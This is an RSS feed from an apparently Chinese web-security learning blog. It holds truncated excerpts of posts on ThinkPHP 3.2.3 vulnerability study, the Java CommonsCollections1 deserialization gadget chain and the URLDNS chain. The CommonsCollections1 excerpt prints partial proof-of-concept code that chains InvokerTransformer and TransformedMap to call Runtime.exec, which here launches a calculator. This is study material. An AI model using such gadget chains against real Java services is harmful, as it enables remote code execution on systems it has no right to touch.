<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
  <channel>
    <title>N1Rvana&#39;s Blog</title>
    <link>https://nlrvana.github.io/</link>
    <description>Web Security</description>
    <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 15 Jan 2024 00:17:31 &#43;0800</lastBuildDate>
      <atom:link href="https://nlrvana.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
  <title>ThinkPHP3.2.3漏洞学习</title>
  <link>https://nlrvana.github.io/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</link>
  <pubDate>Mon, 15 Jan 2024 00:17:31 &#43;0800</pubDate>
  <author>Author</author>
  <guid>https://nlrvana.github.io/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</guid>
  <description><![CDATA[环境搭建ThinkPHP3
composer create-project topthink/thinkphp=版本号 文件名
ThinkPHP5(完整版)
composer create-project topthink/think=版本号 文件名
阿里云 Compose 全量镜像资源库
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
https://www.runoob.com/w3cnote/composer-install-and-usage.html
https://packagist.org/
框架了解审计之前，我们需要了解框架的信息
ThinkPHP3.2.3完全开发手册
composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3
1 2 3 4 index.php 入口文件 Application 应用目录 Public 资源文件目录 ThinkPHP 框架目录 其中框架目录ThinkPHP的结构如下
1 2 3 4 5 6 7 8 9 10 11 12 Common 核心公共函数目录 Conf 核心配置目录 Lang 核心语言包目录 Library 核心类库目录 Think 核心Think类库目录 Behavior 行为类库目录 Org Org类库目录 Vendor 第三方类库目录 ... 更多类库目录 Mode 框架应用模式目录 Tpl 系统模板目录 ThinkPHP.]]></description>
</item>
<item>
  <title>CommonsCollections1链详解</title>
  <link>https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/</link>
  <pubDate>Sun, 14 Jan 2024 23:37:48 &#43;0800</pubDate>
  <author>Author</author>
  <guid>https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/</guid>
  <description><![CDATA[CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
valueTransformer变量可控
但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
再查看一下哪里调用了checkSetValue()方法，只有这一处
setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.]]></description>
</item>
<item>
  <title>URLDNS链详解</title>
  <link>https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/</link>
  <pubDate>Sun, 14 Jan 2024 00:12:12 &#43;0800</pubDate>
  <author>Author</author>
  <guid>https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/</guid>
  <description><![CDATA[&lt; !&ndash;more&ndash;&gt;
先来看一下如何序列化/反序列化
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.]]></description>
</item>
</channel>
</rss>
